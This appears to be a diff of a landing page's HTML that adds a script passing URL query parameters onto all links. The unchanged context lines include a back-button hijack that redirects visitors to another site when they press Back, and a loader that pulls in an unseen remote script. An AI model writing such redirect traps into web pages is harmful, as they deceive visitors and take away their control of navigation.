@@ -187,6 +187,35 @@
         <script>var back_redirect_back_link="https://habitsforabalancedlife.life/vshs1"+location.search;history.pushState({},"",location.href),history.pushState({},"",location.href),window.addEventListener("popstate",(function(t){t.state&&setTimeout((function(){location.href=back_redirect_back_link}),1)}),!1);</script>
         <script type="text/javascript" defer="">document.body.appendChild(Object.assign(document.createElement("script"), {src: "https://cdn.atomicatpages.com/a.js?cache=" + Math.floor((Math.random() * 100000)),async: true}));</script>
         
-      
+      <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        function getUTMParameters() {
+            let params = {};
+            let queryString = window.location.search.substring(1);
+            let regex = /([^&=]+)=([^&]*)/g;
+            let match;
+            while (match = regex.exec(queryString)) {
+                params[decodeURIComponent(match[1])] = decodeURIComponent(match[2]);
+            }
+            return params;
+        }
+
+        function addUTMParametersToLinks() {
+            let utmParams = getUTMParameters();
+            let utmString = Object.keys(utmParams).map(key => `${key}=${utmParams[key]}`).join('&');
+            let links = document.querySelectorAll('a');
+
+            links.forEach(link => {
+                let url = new URL(link.href);
+                if (utmString) {
+                    url.search += (url.search ? '&' : '') + utmString;
+                    link.href = url.toString();
+                }
+            });
+        }
+
+        addUTMParametersToLinks();
+    });
+</script>
       
     </body></html>
